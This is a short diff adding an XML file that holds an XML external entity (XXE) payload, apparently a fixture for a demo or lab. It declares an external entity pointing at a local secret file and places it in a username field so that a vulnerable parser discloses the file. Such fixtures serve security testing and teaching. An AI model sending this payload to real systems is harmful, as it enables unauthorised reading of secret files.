@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///app/demo-secrets/secret.txt">
+]>
+<userProfile>
+  <username>&xxe;</username>
+</userProfile>
